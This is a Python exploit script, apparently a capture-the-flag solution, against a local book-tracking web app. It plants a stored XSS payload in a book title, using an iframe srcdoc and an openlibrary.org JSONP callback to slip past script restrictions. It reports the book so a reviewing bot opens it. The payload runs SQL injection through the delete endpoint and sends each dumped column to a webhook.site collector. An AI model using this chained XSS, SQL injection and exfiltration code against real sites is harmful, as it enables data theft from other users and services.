import requests
import json
from time import sleep


def registerAndLogin(username, password):
    params = {
        "username": username,
        "password": password,
    }

    response = requests.post(
        f"{BASE_URL}/register",
        params=params,
    )

    # print(response.text)

    response = requests.post(
        f"{BASE_URL}/api/login",
        params=params,
    )

    try:
        return json.loads(response.text)["token"]
    except Exception as e:
        print(e, response.text)


def deleteAllBooks(
    cookie,
):
    response = requests.get(
        f"{BASE_URL}/getBooks",
        cookies={
            "token": cookie,
        },
    )

    books = json.loads(response.text)

    for book in books:
        requests.post(
            f"{BASE_URL}/api/delete/?title={book['title']}",
            cookies={
                "token": cookie,
            },
        )


def createPayload(exploit):
    return (
        """<iframe srcdoc="<script src='https://openlibrary.org/api/books?bibkeys=ISBN:x&callback="""
        + exploit
        + """//'></script>1337"></iframe>"""
    )


def createBook(cookie, payload):
    data = {
        "title": payload,
        "author": "abcdef",
        "pages": 0,
        "imageLink": "/assets/icons/bookshelf.svg",
        "link": "",
        "read": False,
        "fav": False,
    }

    response = requests.post(
        f"{BASE_URL}/api/create/",
        cookies={
            "token": cookie,
        },
        headers={
            "Content-Type": "application/json",
        },
        json=data,
    )

    return json.loads(response.text)["book"]["liteId"]


def report(
    cookie,
    user,
    payloadLiteId,
):
    data = {
        "user": user,
        "liteId": payloadLiteId,
        "reason": "abc",
    }

    response = requests.post(
        f"{BASE_URL}/report/",
        cookies={
            "token": cookie,
        },
        headers={
            "Content-Type": "application/json",
        },
        json=data,
    )

    return response.text


BASE_URL = "http://localhost:1337"

BIN_URL = "https://webhook.site/avcdf"

exploit = (
    "fetch(`/api/delete/?title=%22 UNION SELECT 1337 FROM BOOKS--`,{method:`post`}).then((r)=>r.text()).then((r)=>(window.top.location=`"
    + BIN_URL
    + "?x=${ r }`));"
)

columns = [
    "group_concat(title)",
    "group_concat(author)",
    "group_concat(pages)",
    "group_concat(imageLink)",
    "group_concat(link)",
    "group_concat(fav)",
    "group_concat(read)",
    "group_concat(liteId)",
]

exploits = [exploit.replace("1337", x) for x in columns]

cookieA = registerAndLogin("user1234", "user1234")

cookieB = registerAndLogin("user5678", "user5678")

deleteAllBooks(cookieA)  # make space

for exp in exploits:
    payload = createPayload(exp)

    payloadLiteId = createBook(cookieA, payload)

    print(report(cookieB, "user1234", payloadLiteId))

    sleep(5)
